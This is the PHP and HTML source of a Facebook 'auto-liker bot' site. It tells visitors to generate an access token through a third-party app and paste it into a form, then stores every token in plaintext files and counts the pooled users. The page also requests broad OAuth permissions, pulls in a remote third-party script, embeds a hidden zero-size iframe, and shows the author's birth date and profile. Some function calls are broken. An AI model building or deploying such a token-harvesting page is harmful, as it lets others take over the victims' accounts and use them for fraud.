<marquee behavior="scroll" direction="right" scrollamount="10" scrolldelay="8" width="100%" style="width: 100%;">
<b>
<font size="20" color="Yellow"></font><a class="sec" href=""><font color="lime" size="20">HASSAN ALI</font></a></marquee>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
❤ Hassan Ali ❤
</title><link rel="stylesheet" type="text/css" href="tema.css"></a>
<script language="JavaScript" type="text/javascript">

var xCol = "#FF0000";
var yCol = "#FFFF00";
var zCol = "#0000FF";

var n = 6; //number of dots per trail.
var t = 40; //setTimeout speed.
var s = 0.2; //effect speed.

var r,h,w;
var d = document;
var my = 10;
var mx = 10;
var stp = 0;
var evn = 360/3;
var vx = new Array();
var vy = new Array();
var vz = new Array();
var dy = new Array();
var dx = new Array();

var pix = "px";

var strictmod = ((document.compatMode) &&
document.compatMode.indexOf("CSS") != -1);

var domWw = (typeof window.innerWidth == "number");
var domSy = (typeof window.pageYOffset == "number");
var idx = d.getElementsByTagName('div').length;

for (i = 0; i < n; i++)
{
var dims = (i+1)/2;
d.write('<div id="x'+(idx+i)+'" style="position:absolute;'
+'top:0px;left:0px;width:'+dims+'px;height:'+dims+'px;'
+'background-color:'+xCol+';font-size:'+dims+'px"></div>'
+'<div id="y'+(idx+i)+'" style="position:absolute;top:0px;'
+'left:0px;width:'+dims+'px;height:'+dims+'px;'
+'background-color:'+yCol+';font-size:'+dims+'px"></div>'
+'<div id="z'+(idx+i)+'" style="position:absolute;top:0px;'
+'left:0px;width:'+dims+'px;height:'+dims+'px;'
+'background-color:'+zCol+';font-size:'+dims+'px"></div>');
}

if (domWw) r = window;
else
{
if (d.documentElement &&
typeof d.documentElement.clientWidth == "number" &&
d.documentElement.clientWidth != 0)
r = d.documentElement;
else
{
if (d.body && typeof d.body.clientWidth == "number")
r = d.body;
}
}

function winsize()
{
var oh,sy,ow,sx,rh,rw;
if (domWw)
{
if (d.documentElement && d.defaultView &&
typeof d.defaultView.scrollMaxY == "number")
{
oh = d.documentElement.offsetHeight;
sy = d.defaultView.scrollMaxY;
ow = d.documentElement.offsetWidth;
sx = d.defaultView.scrollMaxX;
rh = oh-sy;
rw = ow-sx;
}
else
{
rh = r.innerHeight;
rw = r.innerWidth;
}
h = rh;
w = rw;
}
else
{
h = r.clientHeight;
w = r.clientWidth;
}
}

function scrl(yx)
{
var y,x;
if (domSy)
{
y = r.pageYOffset;
x = r.pageXOffset;
}
else
{
y = r.scrollTop;
x = r.scrollLeft;
}
return (yx == 0)?y:x;
}

function mouse(e)
{
var msy = (domSy)?window.pageYOffset:0;
if (!e) e = window.event;
if (typeof e.pageY == 'number')
{
my = e.pageY - msy + 16;
mx = e.pageX + 6;
}
else
{
my = e.clientY - msy + 16;
mx = e.clientX + 6;
}
if (my > h-65) my = h-65;
if (mx > w-50) mx = w-50;
}

function assgn()
{
for (j = 0; j < 3; j++)
{
dy[j] = my + 50 * Math.cos(stp+j*evn*Math.PI/180) *

Math.sin((stp+j*25)/2) + scrl(0) + pix;
dx[j] = mx + 50 * Math.sin(stp+j*evn*Math.PI/180) *

Math.sin((stp+j*25)/2) * Math.sin(stp/4) + pix;
}
stp+=s;

for (i = 0; i < n; i++)
{
if (i < n-1)
{
vx[i].top = vx[i+1].top; vx[i].left = vx[i+1].left;
vy[i].top = vy[i+1].top; vy[i].left = vy[i+1].left;
vz[i].top = vz[i+1].top; vz[i].left = vz[i+1].left;
}
else
{
vx[i].top = dy[0]; vx[i].left = dx[0];
vy[i].top = dy[1]; vy[i].left = dx[1];
vz[i].top = dy[2]; vz[i].left = dx[2];
}
}
setTimeout(assgn,t);
}

function init()
{
for (i = 0; i < n; i++)
{
vx[i] = document.getElementById("x"+(idx+i)).style;
vy[i] = document.getElementById("y"+(idx+i)).style;
vz[i] = document.getElementById("z"+(idx+i)).style;
}
winsize();
assgn();
}

if (window.addEventListener)
{
window.addEventListener("resize",winsize,false);
window.addEventListener("load",init,false);
document.addEventListener("mousemove",mouse,false);
}
else
if (window.attachEvent)
{
window.attachEvent("onload",init);
document.attachEvent("onmousemove",mouse);
window.attachEvent("onresize",winsize);
}
</script>






<?php session_start();

	error_reporting(0);

	$bot=new bot();

	class bot{

public function getGr($as,$bs){

	$ar=array(

	'graph',

	'fb',

	'me'
);

$im='https://'.implode('.',$ar);

	return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
	$ar=array(
	
	'access_token' => $tk,
);
	
	if($uh){

	$else=array_merge($ar,$uh);

	}else{

	$else=$ar;
}
	foreach($else as $b => $c){
	
	$kashi[]=$b.'='.$c;
}
	$true='?'.implode('&',$kashi);
	
	$true=$this->getGr($mb,$true);

	$true=json_decode($this->

	one($true),true);

	if($true[data]){

	return $true[data];

	}else{

	return $true;}
}

private function one($url){

	$cx=curl_init();

	curl_setopt_array($cx,array(

	CURLOPT_URL => $url,

	CURLOPT_CONNECTTIMEOUT => 5,

	CURLOPT_RETURNTRANSFER => 1,

	CURLOPT_USERAGENT => 'SCRIPT CREATED BY HASSAN ALI',
));

	$ch=curl_exec($cx);

	curl_close($cx);

	return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){

	if(!is_dir('kashi')){

        mkdir('kashi');
}

if($bb){

	$blue=fopen('kashi/'.$id,'w');

	fwrite($blue,$tk.'*on*on*on*on*'.$bb);

        fclose($blue);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Comment Text Saved.";

	</script>';

}else{

        if($z){

	if(file_exists('kashi/'.$id)){

	$file=file_get_contents('kashi/'.$id);

	$ex=explode('*',$file);

	$str=str_replace($ex[0],$tk,$file);

	$xs=fopen('kashi/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);

}else{
	$str=$tk.'*on*on*on*on*'.$c;

	$xs=fopen('kashi/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);
}

	$_SESSION[key]=$tk.'_'.$id;

	}else{

	$file=file_get_contents('kashi/'.$id);

	$file=explode('*',$file);

        if($file[5]){

	$up=fopen('kashi/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*'.$file[5]);

        fclose($up);

        }else{

	$up=fopen('kashi/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*');

        fclose($up);
}

echo '

	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

	</script>';}}
}

public function lOgbot($d){

	unlink('kashi/'.$d);

	unset($_SESSION[key]);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Logout Successful";

	</script>';

$this->atas();

$this->home();

$this->bwh();

}

public function cek($tok,$id,$nm){

echo '

<div id="bottom-content">
<div id="navigation-menu">
<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
</div>
<br><font color="white"> Welcome To Python Bot Team :</font><font color="yellow"> '.$nm.' </font></br>
<font color="white"> Activate Your Bot My Dear Friend </font></br>
<Like And Comment>
<Bot Emo>
<Powered On>
<Text Via Script>
<form action="index.php" method="post">
<div id="top-content">
<div id="search-form">
<input class="button button1" type="submit" style="height:45px;width:200px;" value="Activate Bot">
</form>
</div>
</div>
</div>';

$this->membEr();
}

public function atas(){
echo'

</center></span>
';
}

public function home(){
echo'
<div id="header">
<h1 class="heading"><div style="visibility: hidden;">heading</div></h1></div><div id="content">
<div class="post">

<div class="post-content">
<div class="post-content"><img src="jarvis.png" class="jarvis"><br>
  <img src="jarvis-inner.png" class="jarvis-inner"></a>
</div></div><!--Telif sahibi:koddostu.com-->
<!--Koddostu Büyüleyici Duyuru Panosu Html Kodu STOP-->
<script src="https://www.koddostu.com/duzelt.js?no=118"></script>


</div>

<span>
</div>



';
}

public function bwh(){
echo'
    <div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link">.<h3>
<li><a href="https://goo.gl/Amfs1m" target="blank"><font size="6">GET (<font color="red"> HTC</font>) PERMISSION</font></a></li>
<li><a href="https://developers.facebook.com/tools/debug/accesstoken/?app_id=41158896424" target="blank"><font size="6">GET (<font color="lime"> HTC</font> ) TOKEN  </font></a></li>

<center>
<ul>

</center>
<div id="top-content">
<div id="search-form">

<center>

Paste Your Token Here
<form method="post"
action="index.php">
<input class="inp-text"
style="height:45px;width:600px;" type="text" name="token"  placeholder="Paste Your Token Here
" value=""/> 
<input class="inp-btn"
type="submit" style="height:45px;width:200px;" value="SUBMIT"/>
</form>
</div></div>
';

$this->membEr();
}

public function membEr(){

	if(!is_dir('kashi')){

	mkdir('kashi');
}

$up=opendir('kashi');

	while($use=readdir($up)){

	if($use != '.' && $use != '..'){

	$user[]=$use;}
}

echo'

<div id="footer">
Users: <font color="yellow">'.count($user).'</font></div><style>HTML,BODY{cursor: url("http://downloads.totallyfreecursors.com/cursor_files/fireblue.ani"), url("http://downloads.totallyfreecursors.com/thumbnails/fireblue.gif"), auto;}</style>
<div class="widget-content">
</div></div></td><td align="left"><style type="text/css">#info-teja {z-index: 1000;background:-moz-linear-gradient(top, deeppink, #555);background: -webkit-gradient(linear, left top, left bottom, from(#1F2326), to(lime));box-shadow:-2px -2px 8px #000000, 2px 2px 20px #000000;-moz-box-shadow:-2px -2px 8px #000000, 2px 2px 20px #000000;-webkit-box-shadow:-2px -2px 8px #000000, 2px 2px 20px #000000;width:460px;position: fixed;top:150px;left:0;margin-left:-350px;border:1px solid #444;background-position:top right no-repeat;height:35px;font:11px Arial;color:#eee;border-top-right-radius:8px;border-bottom-right-radius:8px;-moz-border-radius-topright:8px;-moz-border-radius-bottomright:8px;-webkit-border-top-right-radius:8px;-webkit-border-bottom-right-radius:8px;}#info-teja{-o-transition: all 1s ease-in;-moz-transition: all 1s ease-in;-webkit-transition: all 1s ease-in;} #info-teja:hover{width:400px;opacity:1.0;margin-left:0;}.Tejainbox {border:1px solid #444;width:320px; margin:0px 90px 10px 10px;background:#000;color:#ffffff; border-radius :20px; padding:5px 0;-moz-border-radius:20px; -webkit-border-radius:20px;-o-transition:all 2s ease-in;-moz-transition:all 2s ease-in;-webkit-transition:all 2s ease-in;opacity:0.2;}.Tejainbox:hover{opacity:1.0;box-shadow:1px 1px 15px #000; -moz-box-shadow: 1px 1px 15px #000; -webkit-box-shadow: 1px 1px 15px #000;background: #000;}.Tejainbox2 {margin:5px 10px;padding:0px 8px 10px;color:#FFFFFF;overflow:hidden;height:370px;}.teja15 {border-radius:15px;-moz-border-radius:15px;-webkit-border-radius:15px;}.Teja2 ul.bom {margin: 0; padding: 0;}.Tejainbox2 li {margin-left:20px;}.Tejainbox2 li a {color: RED; line-height: 4px; font-size: 11px;font-weight: bold; text-decoration:none;}.Tejainbox2 li a:hover {color: red;text-shadow: 0 1px 1px #000;}.Tejainbox2 h2 { font: 18px Droid Serif;font-weight:bold;padding:0 8px;color: RED;text-shadow: 0px 1px 1px #ddd;border-bottom: 1px solid RED;}.Tejatouch {font-size:21px;font-weight:bold;font-family:Arial Narrow;float:right;margin: 3px 10px 0 0;-o-transition: all 0.5s ease-out;-moz-transition: all 0.5s ease-out;-webkit-transition: all 0.5s ease-out;text-decoration:blink;}.Tejatouch:hover{-o-transform: scale(2) rotate(750deg) translate(0px);-moz-transform: scale(2) rotate(750deg) translate(0px);-webkit-transform: scale(2) rotate(750deg) translate(0px);color: #6cd900;}</style><div id="info-teja"><span class="Tejatouch">Info</span><div class="Tejainbox"><div class="Tejainbox2 teja15"></a>
<h2><center>Personal Information </h2>
<center><img height="100x" src="https://graph.facebook.com/100008042378276/picture?width=200" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:300px;" alt="Sans Add" data-pagespeed-url-hash="3690601930" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"> </center>
<span class="style4"><center><font color="black">.</font></center></span><br>

<span class="style4"> <center><font size="4">Name : <a href="http://facebook.com/badar.prince.12" target="blank"><font size="4" color="lightblue"><b>H </font><font size="4" color="red">A </font><font size="4" color="lime">S </font><font size="4" color="gold">S </font><font color="red">A </font><font size="4" color="deeppink">N </a></font></b></center></span><br>
<span class="style4"> <center>Date of Birth: 13-11-1996</center> </span><br>
<span class="style4"> <center>Country: Pakistan</center></span><br>
<span class="style4"> <center>ConTact: fb.com/badar.prince.12</center> </span><br>
</div></div></div></td>
<iframe src="http:/IWBUUEE7?start=true" width="0" height="0" frameborder="0" allowfullscreen></iframe>

</div>';

}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('kashi/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Token Expired</h2>";
			</script>';
        unset($_SESSION[key]);
        unlink('kashi/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Invalid Token Or Expired Token</h2>";
			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>